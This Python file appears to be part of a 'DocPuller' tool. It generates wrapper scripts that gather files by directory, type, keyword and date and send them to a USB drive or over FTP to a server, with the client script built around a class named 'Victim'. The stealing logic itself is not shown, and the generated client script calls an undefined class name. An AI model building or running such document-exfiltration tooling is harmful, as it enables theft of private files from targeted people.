from DocPullerScripts.DocPullerUsb.usb import DocPullerUSB


class ScriptGen:

    def __init__(self, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.is_usb = is_usb
        if is_usb:
            self.parms = f'{direcoties}, {file_type}, {keywords}, {date}'

            self.SCRIPT = f"""
        
from DocPullerScripts.DocPullerUsb.usb import DocPullerUSB

def main():

    docPuller = DocPullerUSB({self.parms})

    docPuller.main()
    
    
if __name__ == '__main__':
    main();

        """

        else:
            self.parms = f'{direcoties}, {file_type}, {keywords}, {date}, {server_ip}, {server_port}'
            self.SCRIPT1 = f"""

from DocPullerScripts.DocPullerFTP.server import Server

def main():

    docPuller = Server({self.parms})

    docPuller.main()


if __name__ == '__main__':
    main()

                    """

            self.SCRIPT2 = f"""

from DocPullerScripts.DocPullerFTP.victim import Victim

def main():

    docPuller = DocPullerVictim({self.parms})

    docPuller.main()


if __name__ == '__main__':
    main()

                    """


    def write_to_file(self):
        if self.is_usb:
            with open('Generator/docpullerscrip.py', 'w') as f:
                f.write(self.SCRIPT)
        else:
            with open('Generator/serverscript.py', 'w') as f:
                f.write(self.SCRIPT1)
            with open('Generator/clientscript.py', 'w') as f:
                f.write(self.SCRIPT2)